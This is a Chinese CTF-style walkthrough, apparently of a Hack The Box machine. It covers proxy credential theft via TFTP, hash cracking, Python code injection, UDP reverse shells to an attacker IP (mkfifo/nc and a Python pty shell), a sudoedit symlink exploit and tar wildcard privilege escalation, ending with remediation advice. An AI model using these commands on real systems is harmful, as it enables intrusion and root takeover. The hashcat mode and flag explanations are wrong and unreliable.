@@ -1,0 +1,102 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="aea004543360223c1d255e27d9f24963">信息收集</h1>
+<h2 data-content="1" id="beff3981e3e757444e636ed44267ed3f">端口扫描</h2>
+<p>nmap共找到3个有用的端口分别是openssh(22),tftp(69)，squid(3128)</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514173915-d42401ce-11d5-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514173939-e266de64-11d5-1.png"/></p>
+<h3 data-content="1" id="0eacf2a531086c0b4c34a8140759bb32">Squid Proxy w/o Creds - TCP 3128</h3>
+<p>通过搜索我们得到3128可能是代理，但是我们没有证号密码无法登录，继续信息收集</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514174021-fb4e3e36-11d5-1.png"/></p>
+<p>tftp通过69端口下载到squid配置文件</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514174149-2ff172f2-11d6-1.png"/><br/>
+查询配置文件发现passwords</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514174239-4d5a188a-11d6-1.png"/></p>
+<h4 data-content="1" id="b70fe70bfa8d6bca86fbf2409744353f">hash破解</h4>
+<pre><code>hashcat -m 1600 passwords -a 0 -w3 /usr/share/wordlists/rockyou.txt --user
+
+ -m 1600：指定哈希类型为1600，这通常对应于NetNTLMv2哈希类型。
+passwords：这是包含哈希值的文件名，hashcat将会尝试破解这些哈希值。
+-a 0：指定攻击模式。-a 0 代表直线攻击（Straight attack），即直接尝试用字典中的每个密码去匹配哈希值。
+-w3：设置线程并行数，这里是3，意味着hashcat会使用3个线程并行地进行攻击</code></pre>
+<p>hash破解以后我们添加到代理3128端口</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514174357-7c5e6410-11d6-1.png"/></p>
+<p>访问外部ip出现错误</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514174418-88e2fa5c-11d6-1.png"/><br/>
+尝试内部ip</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514174448-9a47c78c-11d6-1.png"/></p>
+<p>循环查看服务内部开放端口</p>
+<pre><code>time for i in {1..65535}; do curl -s -U kalamari:ihateseafood -x 10.129.1.116:3128 127.0.0.1:${i} | grep -q "Squid Error" || echo "$i"; done</code></pre>
+<p>发现80端口<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514174650-e36a5dee-11d6-1.png"/></p>
+<h2 data-content="1" id="caf565c22dd50c10279fcd10146621c4">漏洞扫描</h2>
+<p>nikto -h 127.0.0.1 -useproxy <a href="http://10.129.1.116:3128" target="_blank">http://10.129.1.116:3128</a></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514174815-15f3bd1e-11d7-1.png"/></p>
+<h3 data-content="1" id="6d534b6bf2147779cf674c0f6b3128a9">目录扫描</h3>
+<p>dirb <a href="http://127.0.0.1" target="_blank">http://127.0.0.1</a> -p 10.129.1.116:3128 -P kalamari:ihateseafood -r</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514174850-2a85a972-11d7-1.png"/></p>
+<h4 data-content="1" id="0b18216a041cbc13add8d923ec9750ad">网站访问</h4>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514174934-450c1312-11d7-1.png"/></p>
+<p>根据前面得到的信息，我们可以看到是python，使用python语法测试</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514175020-60b232d6-11d7-1.png"/></p>
+<p>反弹shell失败</p>
+<pre><code>import os, pty, socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('you ip',80))</code></pre>
+<p>查看能否ping出网<br/>
+os.system('ping -c1 you ip')<br/>
+sudo tcpdump -ni tun0 icmp</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514175218-a6e45842-11d7-1.png"/></p>
+<h4 data-content="1" id="8ba790cdc16e97ed4b81245d4ae3c49b">查看防火墙</h4>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514175235-b1002018-11d7-1.png"/><br/>
+根据防火墙规则发现，出站只让udp<br/>
+设置udp出站</p>
+<pre><code>os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1 | nc -u 10.10.*.* 443 &gt;/tmp/f &amp;").read()</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514175400-e3be1a50-11d7-1.png"/></p>
+<h2 data-content="1" id="3d540be03ffaa11b2c734c5118c7ff24">Privilege Escalation 提权</h2>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514175441-fbec71da-11d7-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514175453-03406568-11d8-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514175505-0a5235d4-11d8-1.png"/><br/>
+查看发现存在sudoedit引发的漏洞<br/>
+<a href="https://www.exploit-db.com/exploits/37710" target="_blank">https://www.exploit-db.com/exploits/37710</a><br/>
+如果通配符使用两次，sudoedit 不会检查完整路径。因此，为了利用这一点，可以创建了一个指向 /etc/shadow 的符号链接<br/>
+当使用通配符时，它不会检查完整路径使用两次，这意味着符号链接可用于访问编写配置的人可能不是程序设置者想要的结果</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514175628-3bceff2a-11d8-1.png"/></p>
+<h3 data-content="1" id="b69ddfa349a89f53e73f63f433ca3b18">漏洞利用</h3>
+<p>配置生成ssh文件<br/>
+ssh-keygen -t rsa -b 4096 生成ssh密钥<br/>
+写入公钥<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514175717-58cf10e2-11d8-1.png"/></p>
+<h4 data-content="1" id="6a20a2b3f6f15e136df91f2508a1ccfe">登录</h4>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514175746-6a51d552-11d8-1.png"/></p>
+<h2 data-content="1" id="c40a8dde529f324595cd6a903f05c344">Priv：alekos –&gt; root 2次提权</h2>
+<p>上传pspy,因为出站只能udp，所以我们使用scp 上传</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514180014-c2a69b70-11d8-1.png"/></p>
+<p>我们会发现他会每过一段时间执行tar cf(这个图是后截)</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514180111-e486ae4c-11d8-1.png"/></p>
+<p>查看备份文件</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514175834-86a51e1c-11d8-1.png"/></p>
+<p>我们找到了tar cf在bash中可能引起的利用<br/>
+<a href="https://www.soliantconsulting.com/blog/dangers-wildcards-bash/" target="_blank">https://www.soliantconsulting.com/blog/dangers-wildcards-bash/</a></p>
+<h3 data-content="1" id="c2ebe3846e8a92c3f8a14966c4d7da16">漏洞利用</h3>
+<p>因为他只支持udp，所以我们要找寻或者编写udp格式的执行文件<br/>
+第一种:python</p>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/python</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+
+<span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">([</span><span class="s1">'python'</span><span class="p">,</span> <span class="s1">'-c'</span><span class="p">,</span> <span class="s1">'import os; import pty; import socket; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect(("10.10.*.*", 1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); os.putenv("HISTFILE","/dev/null"); pty.spawn("/bin/sh"); s.close()'</span><span class="p">])</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514180622-9dc9b52a-11d9-1.png"/></p>
+<p>第二种:bash</p>
+<div class="highlight"><pre><span></span>rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f<span class="p">|</span>/bin/sh -i <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">|</span>nc -u <span class="m">10</span>.10.*.* <span class="m">1234</span> &gt;/tmp/f
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514180634-a4e63ee6-11d9-1.png"/></p>
+<p>执行稍等一会会反弹成功</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514180652-afb370e6-11d9-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240514180729-c5fc56ba-11d9-1.png"/></p>
+<p>上面如果是python则改变 touch -- "--checkpoint-action=exec=sh shell.sh"为 touch -- "--checkpoint-action=exec=python shell.py"</p>
+<h3 data-content="1" id="6396c005e30fd22bec2c2679a28a6d9f">总结</h3>
+<p>首先通过信息收集中的常规操作，先端口扫描，然后进行枚举，发现了tftp信息泄露squid内部信息，造成代理访问内网，进一步造成内部python代码执行，同时配置错误匹配方式错误软件版本问题，造成了可以root.<br/>
+所以我们一点到面的要进行比如tftp的修复，比如设置权限无法访问内部/etc/下文件，或者sudoedit不使用<em>匹配，由此可以看出安全要所有操作以最小化原则和限制访问，比如这里把路径不使用</em>，不让任意匹配</p>
+</div>
+</div>
